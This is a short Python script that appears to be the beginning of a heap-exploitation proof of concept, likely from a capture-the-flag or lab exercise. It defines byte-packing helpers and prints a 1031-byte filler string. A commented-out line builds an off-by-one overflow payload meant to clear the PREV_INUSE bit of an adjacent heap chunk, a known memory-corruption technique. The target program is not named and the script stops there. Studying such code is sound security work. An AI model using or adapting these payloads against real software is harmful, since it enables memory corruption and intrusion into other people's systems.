#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import struct

sp64 = partial(struct.pack, "<q")
p64 = partial(struct.pack, "<Q")
p8 = partial(struct.pack, 'B')
pr = partial(print, end="")


## Full valid input len + NULL (end of C string)
pr("a" * 1031)

## Clear PREV_INUSE bit
# pr("a" * 1032 + p8(0x10) + p8(0x40))
